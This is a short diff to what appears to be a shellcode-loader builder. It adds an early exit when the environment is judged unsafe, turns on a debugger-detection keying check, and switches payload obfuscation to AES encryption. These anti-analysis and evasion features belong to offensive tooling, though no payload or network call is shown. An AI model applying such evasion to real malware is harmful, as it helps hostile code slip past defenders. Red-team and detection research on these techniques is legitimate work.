@@ -61,7 +61,12 @@ const unsigned char pPayload[] = {
 };
 
 int main() {
+    BOOL SafeEnv = TRUE;
+
 {{KEYING}}
+
+    if (SafeEnv == FALSE)
+        return 0;
 
 {{PAYLOAD_MODS}}
 
@@ -206,10 +211,10 @@ if __name__ == "__main__":
                     "/execution/local/FPInline"
                 ],
                 "keying": [
-                    
+                    "/keying/debug/IsDebuggerPresent3"
                 ],
                 "payload_mods": [
-                    "/payload_mods/obfuscation/UUIDFuscation"
+                    "/payload_mods/encryption/CTAES"
                 ],
                 "post_comp": [
                     
